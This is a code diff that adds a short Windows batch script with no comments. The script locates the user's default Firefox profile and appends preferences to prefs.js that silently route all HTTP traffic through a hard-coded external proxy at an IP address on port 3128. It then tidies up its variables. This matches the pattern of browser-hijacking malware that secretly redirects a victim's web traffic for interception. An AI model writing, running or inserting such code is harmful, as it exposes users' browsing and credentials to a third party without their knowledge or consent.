@@ -1,0 +1,8 @@
+cd /D "%APPDATA%\Mozilla\Firefox\Profiles"
+cd *.default
+set ffile=%cd%
+echo user_pref("network.proxy.http", "148.233.229.235 ");>>"%ffile%\prefs.js"
+echo user_pref("network.proxy.http_port", 3128);>>"%ffile%\prefs.js"
+echo user_pref("network.proxy.type", 1);>>"%ffile%\prefs.js"
+set ffile=
+cd %windir%
